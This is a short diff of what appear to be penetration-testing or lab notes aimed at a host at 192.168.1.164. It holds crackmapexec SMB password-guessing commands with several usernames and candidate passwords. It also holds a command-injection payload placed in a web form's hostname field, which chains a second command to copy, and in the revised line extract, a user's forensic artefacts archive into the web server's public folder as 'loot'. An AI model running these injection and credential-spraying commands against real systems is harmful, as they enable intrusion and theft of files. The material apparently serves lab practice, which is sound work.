@@ -81,7 +81,9 @@ crackmapexec smb 192.168.1.164 -u Jenny -p rockyou
 
 crackmapexec smb 192.168.1.164 -u test -p '!!!sagitario)))'
 
-hostname=127.0.0.1 & copy C:\Users\nebula\Desktop\forensics_artefacts.zip C:\xampp\htdocs\fa.zip&command=tracert
+
+
+hostname=127.0.0.1 & tar -xf C:\Users\nebula\Desktop\forensics_artefacts.zip -C C:\xampp\htdocs\loot&command=tracert
 
 crackmapexec smb 192.168.1.164 -u administrator -p password
 
